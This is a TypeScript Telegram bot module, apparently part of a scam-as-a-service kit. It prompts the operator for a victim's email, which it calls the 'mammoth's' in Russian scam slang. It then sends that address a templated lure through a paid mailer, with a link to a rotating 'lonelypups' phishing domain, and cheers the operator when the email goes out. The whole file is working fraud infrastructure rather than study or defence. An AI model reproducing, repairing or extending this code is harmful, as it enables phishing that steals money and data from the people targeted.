import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {domensRepository, lonelypupsRepository, profilesRepository, userRepository} from "@/database";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import {Lonelypups} from "@/database/models/lonelypups";
import {sendEmailYourMailer} from "@/utils/rassilka/email";
import console from "console";

const regex = /private lonelypups send email/g
export const composer = new Composer<Context>()
composer.callbackQuery(regex, startScene)
async function startScene(ctx: Context) {
    return ctx.scenes.enter('private lonelypups send email')
}

export const sendLonelypupsEmail = new Scene<Context>('private lonelypups send email')



sendLonelypupsEmail.always().callbackQuery('private lonelypupsamount', async (ctx) => {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
})

sendLonelypupsEmail.do(async (ctx) => {
    ctx.session.deleteMessage = []

    const res = await ctx.reply(`🐶 Отправь почту мамонта`, {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'private lonelypupsamount')
    })
    ctx.session.deleteMessage.push(res.message_id)
    ctx.scene.resume()
})

sendLonelypupsEmail.wait().hears(/.+/g,async (ctx) => {
    ctx.session.smsEmail = {ad: 0, to: undefined, pattern: undefined}
    ctx.session.smsEmail.to = ctx.msg.text

    const msg = await ctx.reply(`Выбери мейлера`, {
        reply_markup:  new InlineKeyboard()
            .text('YourMailer | 5%', 'yourmailer')
            .row()
            .text('Отмена', 'private lonelypupsamount')
    })
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

sendLonelypupsEmail.wait().callbackQuery(/yourmailer/g,async (ctx) => {
    ctx.session.smsEmail.pattern = "lonelypups_EU@!!@2.0"

    const domen = await domensRepository.findOne({
        where: {
            service: 'lonelypups',
            special: true,
            active: true
        }
    })

    const msg = await ctx.reply(`⏳`)
    if (ctx.callbackQuery.data === 'yourmailer') {
        const response = await sendEmailYourMailer(
            ctx.session.smsEmail.to,
            ctx.session.smsEmail.pattern,
            `https://${domen.link}/taxi`,
            ctx.from.id)
        try {
            await ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}
        console.log(response, 'yourmailer')
        await ctx.reply(
            (response === "The message has been sent")
                ? `✅ Кис-кис, я котик ты котик &lt;3`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    }

    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    return ctx.scene.exit()
})

async function deleteAllMessages(array: number[], ctx: Context) {
    for (const id of array) {
        try {
            await ctx.api.deleteMessage(ctx.chat.id,id).catch()
        } catch (e) {
            console.log(e)
        }
    }
}